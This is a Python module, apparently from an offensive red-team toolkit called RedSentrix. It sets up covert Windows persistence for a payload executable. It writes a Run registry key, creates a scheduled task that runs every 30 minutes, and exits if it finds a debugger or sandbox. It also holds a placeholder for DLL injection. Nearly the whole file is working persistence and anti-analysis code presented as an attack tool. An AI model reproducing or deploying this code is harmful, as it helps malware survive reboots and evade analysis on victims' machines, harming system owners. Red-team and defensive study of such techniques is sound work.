import os
import sys
import time
import base64
import ctypes
import winreg
import subprocess
from redsentrix_core.stealth_utils import StealthUtils

def is_windows():
    return sys.platform.startswith("win")

def encode_payload(payload: str) -> str:
    return base64.b64encode(payload.encode()).decode()

def decode_payload(encoded_payload: str) -> str:
    return base64.b64decode(encoded_payload.encode()).decode()

def add_to_registry(payload_path: str):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                             r"Software\Microsoft\Windows\CurrentVersion\Run", 0, 
                             winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "RedSentrixLoader", 0, winreg.REG_SZ, payload_path)
        winreg.CloseKey(key)
        print("[+] Registry persistence added.")
    except Exception as e:
        print(f"[-] Registry persistence failed: {e}")

def add_scheduled_task(payload_path: str):
    task_name = "RedSentrixTask"
    command = f"schtasks /Create /SC MINUTE /MO 30 /TN {task_name} /TR \"{payload_path}\" /F"
    try:
        subprocess.run(command, shell=True, check=True)
        print("[+] Scheduled task created.")
    except subprocess.CalledProcessError as e:
        print(f"[-] Scheduled task failed: {e}")

def simulate_dll_injection():
    print("[!] DLL injection not implemented yet. Placeholder.")

def run():
    if not is_windows():
        print("[-] This module is for Windows only.")
        return

    if StealthUtils.is_debugger_present():
        print("[-] Debugger detected, exiting.")
        return

    if StealthUtils.sandbox_check():
        print("[-] Sandbox detected, exiting.")
        return

    # Simulate encoded payload (path to fake exe)
    payload_path = "C:\\Users\\Public\\payload.exe"
    encoded_path = encode_payload(payload_path)
    decoded_path = decode_payload(encoded_path)

    print(f"[+] Using payload: {decoded_path}")

    # Persistence methods
    add_to_registry(decoded_path)
    add_scheduled_task(decoded_path)
    simulate_dll_injection()

    print("[+] Windows Covert Persistence Complete.")

